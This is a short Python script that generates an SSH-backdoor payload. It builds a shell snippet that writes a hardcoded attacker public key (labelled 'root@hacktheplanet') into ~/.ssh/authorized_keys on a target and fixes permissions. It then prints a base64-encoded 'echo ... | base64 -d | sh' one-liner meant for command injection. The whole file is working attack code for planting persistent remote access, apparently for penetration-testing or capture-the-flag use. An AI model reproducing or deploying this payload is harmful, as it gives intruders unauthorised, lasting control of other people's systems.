#!/usr/sbin/python3
import urllib.parse
import sys
import base64

def base64encode(str_to_encode):
    encodedBytes = base64.b64encode(str_to_encode.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")
    return encodedStr

script = '''
mkdir ~/.ssh 2>/dev/null ; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCserSkT7esAbD2dEdsK0bOlMT72EtvCapK4PN4w/ur2Dnu3GR7TvtPZrHd7+1hpUZowk28MDOLian6tZ9ma+6TYUEP25BkwRnUcp6ehprmEkHQBPEaAAtu8pGvyiDanbCOKzSt6TUpsD/uzTuqTmbWOpZVZfXeEgbWCnBPFsXSfEPdFmBpaLeu1nj/nUFh+jm2+BhurCi3W2vH09kFZn7xGyF9ASscvLN5C56BlF0y+PEwJS3MUb50PO3TsIh/GdR3dJaYUPGfaic7Rbgl8QkwIqGAS1jmdUzQlUqz5GTGjY8T5b6VsNYmUwLiAiS3tXFh6g5Nm9y0Om0EiuQvDDV7/c8s3zNMiflbMTwhGhS3QzNiiRvDsonHL9B8HX/i/Tp04LXwZR+s69/rc4U3Ytfg/MkF404dmJnkFuey+kk/lvcx8UwK755QJx5iBnnXpeoZuoeJ4OxAdNKqfzQlm3PJxwPvb6aymPlM+bzVdOXBg02JKGZnk7qszQiYBtXU9ik= root@hacktheplanet > ~/.ssh/authorized_keys ; chmod 600 ~/.ssh/authorized_keys ; chmod 700 ~/.ssh
'''

print(script)
print(f'echo {base64encode(script)} | base64 -d | sh')
